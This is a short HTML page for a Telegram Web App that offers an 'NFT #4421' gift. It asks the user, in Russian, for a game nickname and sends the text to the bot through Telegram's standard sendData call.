<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #1c1c1d; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
        .card { background: #2c2c2e; border-radius: 15px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        input { 
            width: 80%; padding: 12px; margin: 15px 0; 
            border-radius: 8px; border: 1px solid #3a3a3c; 
            background: #1c1c1d; color: white; 
        }
        button { 
            background: #007aff; color: white; border: none; 
            padding: 12px 20px; border-radius: 8px; width: 85%; font-weight: bold;
        }
        .nft-img { width: 100px; height: 100px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://img.icons8.com/fluency/144/diamond.png" class="nft-img">
        <h3>Получение NFT #4421</h3>
        <p>Введите ваш игровой никнейм для привязки подарка:</p>
        <input type="text" id="user_data" placeholder="Ваш никнейм...">
        <button onclick="send()">Подтвердить</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        function send() {
            let val = document.getElementById("user_data").value;
            if(val) {
                tg.sendData(val); // Отправляет текст боту
                tg.close();
            }
        }
    </script>
</body>
</html>
